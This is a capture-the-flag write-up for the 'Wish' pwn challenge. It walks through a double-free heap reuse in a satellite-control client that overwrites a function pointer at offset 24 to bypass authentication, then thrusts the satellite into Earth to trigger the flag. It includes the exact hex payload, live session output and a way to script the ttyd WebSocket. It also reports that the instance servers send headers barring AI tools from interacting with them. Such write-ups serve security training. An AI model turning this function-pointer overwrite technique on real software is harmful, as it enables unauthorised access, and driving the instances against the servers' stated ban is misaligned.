# Wish - pwn (800 points)

**Flag:** `cdctf{W!sh_Up0n_A_Sh0ot1ng_Star_81ab9a33}`
**Materials:** `files/client` (679,960 B, SHA256 `ae308ff5a34c76e60455e5acbd69d7db993cd67fde038d854e114570424d0394`), `files/auth.hh` (2,572 B, SHA256 `556d461e786eca2592521a7812a21f4b9ba9dc4bb9c1aafa61b5de34ab14ba2b`), `files/cmd_auth.hh` (653 B, SHA256 `fe6ac65e7efbc9343065a73a76a634261b04e36e294917f2b55c522bb2f2fda1`)
**Author:** phlox

## Problem Description

The handout ships part of a satellite control system's source (`auth.hh`, `cmd_auth.hh`) plus the `client` binary. The card asks for the satellite to be crashed into Earth.

The instance is a ttyd that execs exactly one command, with no shell:

```text
/bin/sh -c exec env LD_PRELOAD=/opt/wish/shim.so /opt/wish/client /tmp/sat.sock (b92d58887f29)
connected. type HELP for commands.
```

The log implies the split: the simulation server holds the world state (positions, velocities, fuel) and is shared by every connection, while the client holds the session state, including the `authed` flag. Each WebSocket connection spawns a new client process, so everything has to fit in one connection. The client accepts only seven commands: `STATUS`, `AUTHENTICATE`, `THRUST <name> <x> <z>`, `STOP <name>`, `INFO <name>`, `HELP`, `QUIT`.

## Initial Analysis

Triage (`analysis/triage.txt`): `Type: EXEC`, so no PIE and the text segment is fixed at `0x400000`; `GNU_STACK RW`, so NX is on; RELRO covers only up to `0x40d000` while `.got.plt` runs to `0x40d258` and there is no `BIND_NOW`, so Partial RELRO; the binary carries `debug_info` and is not stripped, so every function in the `sat::client` namespace is readable. Notable imports: `malloc`/`free`, `popen`/`pclose` (the gnuplot path used by `STATUS`), `strtod`, `strncmp`, `dlsym`.

Three source fragments set the direction.

```cpp
struct auth_sess
{
   char head[24];
   void (*dbg)(session&); // sizeof(ptr) on 64 bit systems?
   char tail[32];
};
```

`auth_sess` is exactly 64 bytes with `dbg` at offset 24, so the whole struct lives in one 64-byte allocation. The chunk size including metadata depends on the allocator.

```cpp
void contrivance(session& s)
{
   auth_sess* dbg_sess = (auth_sess*)malloc(sizeof(auth_sess));
   auth_sess* dbg_ses2 = (auth_sess*)malloc(sizeof(auth_sess));
   asm volatile("" : : "r"(dbg_sess), "r"(dbg_ses2) : "memory");
   free(dbg_sess);
   free(dbg_ses2);
   free(dbg_sess);
}
```

`get_password()` decodes up to 128 hex characters into a `malloc(64)` buffer. `check_password()` then calls `malloc(64)` for `dummy` and `malloc(64)` for `real_auth_sess`, and runs `if (real_auth_sess->dbg != NULL) real_auth_sess->dbg(s);`.

The allocation sequence inside one `AUTHENTICATE` command (`authenticate` 0x40492f → `contrivance` 0x403a86 → `get_password` 0x404061 → `check_password` 0x4047ae) pops the poisoned LIFO in order: `password` = A, `dummy` = B, `real_auth_sess` = A. The chunk holding the decoded password is therefore the same chunk the `dbg` pointer is loaded from. The hex payload controls that function pointer at offset 24 directly, and the callee receives `s` as its only argument.

Two constants come from the binary: `auth_bypass_dbg` at `0x403ac9`, and since its argument is `session&`, the instruction `mov BYTE PTR [rdi+0x28],0x1` shows `authed` sits at offset `0x28`. With no PIE, `0x403ac9` never moves.

The flag condition is implemented in `vanished_alerts` (0x408120), the only function that prints a flag:

```asm
  4082c9:  lea    rdi,[rsp+0x1f0]
  4082d6:  mov    esi,0x409553          ; "/flag.txt"
  4082f7:  mov    esi,0x409831          ; "\nCONGRATULATIONS: "
```

It compares the body snapshot of two consecutive `STATUS` calls. For every body present before and absent now, it prints `[ALERT] <name> is gone since the last STATUS; probable collision with <other> (last seen gap <d>)`, then reads `/flag.txt` and prints `CONGRATULATIONS: <flag>`. The flag branch sits after `test r15,r15; je ...` at `0x408263`, so at least one body must still be alive in the new snapshot.

`INFO` on the instance: Earth at `(0,0,0)` radius 20 with `mass: 0`, Satellite at `(50,0,0)` radius 5 with `mass: 1` and velocity `(0,0,0)`. A `mass 0` attractor plus constant velocity between commands shows no observed gravitational effect in these measurements; the impact has to be driven.

## Ruled-Out Directions

1. **Guessing the password**: `check_password` only tests `strlen(flag) == strlen(password)` then a full `strncmp`, and the sole feedback is `authenticated` or `authentication failed`, so there is no per-position oracle. Ruled out.
2. **Turning `dbg` into RCE and reading `/flag.txt`**: libc, heap and stack remain ASLR'd (dynamic linking), NX is on, and no command prints a pointer. The primitive is only `call [chunk+0x18]` with the argument `&session`. Ruled out.
3. **Jumping to `popen@plt`**: `popen` really is imported (gnuplot), but the call site at `0x404810` is `mov rdi,rbx; call rax` with `rbx = &session` on `main`'s stack, not the payload chunk, so there is no attacker-controlled command string to hand it. Ruled out.
4. **`shim_flush_class` neutralising the reuse**: the weak wrapper `maybe_flush_shim_class` at `0x403fd4` resolves the name through `dlsym(RTLD_DEFAULT, "shim_flush_class")` (string at `0x409502`), and the call at `0x40489a` is at the end of `check_password`, after `dbg` already ran and `password` was freed. Ruled out.
5. **glibc >= 2.34 aborting on the double free**: the binary requires `__libc_start_main@GLIBC_2.34` and `dlsym@GLIBC_2.34`, and `_int_free` prints `free(): double free detected in tcache 2` since 2.29. Measured on the instance, chunk A is still re-allocated within the same command and nothing aborts. The route works; the precise reason (the `LD_PRELOAD`ed shim.so) was not verified because the box offers no shell to read `/opt/wish/shim.so`.
6. **Waiting for the world to heal, or issuing a reset command**: `ECHO` returns `unknown command: ECHO (type HELP)`, the dispatch table (0x408d6b) holds only those seven verbs, and the satellite position kept increasing monotonically across five fresh connections (`-39048`, `-45188`, `-52655`, `-197933`). Ruled out; a new instance is required.

## Exploit Chain

**Step 1 - Build the 32-byte payload.** Fill `head[24]`, then write the `auth_bypass_dbg` address into `dbg`, little-endian. `memset(password, 0, 64)` already covers the tail.

```python
# 24 bytes head[24] + 8-byte function pointer 0x403ac9 (auth_bypass_dbg)
PAYLOAD = "41" * 24 + "c93a400000000000"   # 64 hex characters
```

**Step 2 - One `AUTHENTICATE` on an untouched world.** `check_password` pops A a second time, `dbg` is non-null, and `auth_bypass_dbg(s)` sets `s.authed = 1` at `[rdi+0x28]`. `check_password` returns `result || s.authed`, prints `authenticated`, and `THRUST` flips from blocked to `OK`.

```text
> AUTHENTICATE
Enter password (hex-encoded): 414141414141414141414141414141414141414141414141c93a400000000000
auth forced via dbgauthenticated
> THRUST Satellite -1 0
OK
```

**Step 3 - Crash and watch inside the same connection.** The win condition is a body disappearing between two `STATUS` calls, so the required order is `STATUS` (baseline snapshot) → `THRUST Satellite -1 0` → poll `STATUS`. Polling every 0.7 s is enough because the impact lands within about 2 s of real time; the server runs 10 ticks per real second, measured from `1705.507 / 68.220297 = 25.0` simulated seconds in 2.5 s.

```bash
python exploit.py wss://<instance-id>.i.cdctf.net/ws
```

```text
> AUTHENTICATE
Enter password (hex-encoded): 414141414141414141414141414141414141414141414141c93a400000000000
auth forced via dbgauthenticated
> STATUS
> THRUST Satellite -1 0
OK
> STATUS
[ALERT] Earth is gone since the last STATUS; probable collision with Satellite (last seen gap 0.332567)
CONGRATULATIONS: cdctf{W!sh_Up0n_A_Sh0ot1ng_Star_81ab9a33}
```

**Verification.** Three checks support the result. Primitive: `auth forced via dbg` is printed only by `auth_bypass_dbg`, and `0x403ac9` is its fixed address in a non-PIE binary. Physics: `mass` walks `1 → 0.75 → 0.5` while `velocity` walks `0 → -28.293854944373365 → -68.220297140345764`, matching the rocket equation `v = ve*ln(m0/m)` with `ve ~ 98.4` (`28.29/ln(4/3) = 98.32`, `68.22/ln 2 = 98.44`), so `-1 0` always burns the whole 68.22 delta-v budget and carries the satellite from `x=50` into Earth's `|x| < 25` band. Flag gate: the `CONGRATULATIONS` branch only runs when the new snapshot still holds a body (`test r15,r15` at `0x408263`), exactly the configuration where Earth is swallowed and the satellite survives.

A side result measured along the way: the collision deletes the lighter body. After the fly-through in the first connection, `INFO Earth` returned `ERR no such body Earth` and `STATUS` plotted only the circle labelled `Satellite`, leaving the world without a second body and therefore incapable of another collision. Fuel is also gone permanently (`mass` stuck at `0.49999999999999994`, `THRUST` answers `OK` while `velocity` no longer changes). The first instance was spent this way and a new subdomain had to be requested; the final chain ran on the second instance.

## Flag

```bash
python exploit.py wss://sbrktohj.i.cdctf.net/ws
```

```text
CONGRATULATIONS: cdctf{W!sh_Up0n_A_Sh0ot1ng_Star_81ab9a33}
```

The flag matches the `cdctf{...}` format from the card and is stored in `flag.txt`. The `exploit.py` in this case is the cleaned-up version of the script that actually ran; both instances had expired by the time of writing, so the cleaned script was not re-run. The `text` blocks above are verbatim output from the live session (see `analysis/live_session.log`).

## Reproduce

```bash
pip install websockets
python exploit.py wss://<instance-id>.i.cdctf.net/ws   # ID from the challenge card
```

Conditions for a rerun:

```bash
# the world must still have two bodies and full fuel
> INFO Earth        # must print a position, not ERR no such body Earth
> INFO Satellite    # mass must be 1
```

If `INFO Earth` answers `ERR no such body Earth`, an earlier impact already consumed that world and the instance must be reset to get a new subdomain. The whole chain has to live in one connection: `authed` belongs to the client process, while the world state belongs to the server and outlives the connection.

The ttyd layer is scriptable: `GET /token` returns `{"token": ""}`, the WebSocket is `wss://<id>.i.cdctf.net/ws` with subprotocol `tty`, the first frame is the text `{"AuthToken": "", "columns": N, "rows": N}`, keystrokes go out as binary frames `'0' + data`, and output arrives as frames starting with `'0'`. Note that every `*.i.cdctf.net` response carries the `X-LLM-Agent-Instruction` and `X-LLM-Policy` headers forbidding AI tools from interacting with instances, so the player types the commands; `exploit.py` here is a reproduction description only.
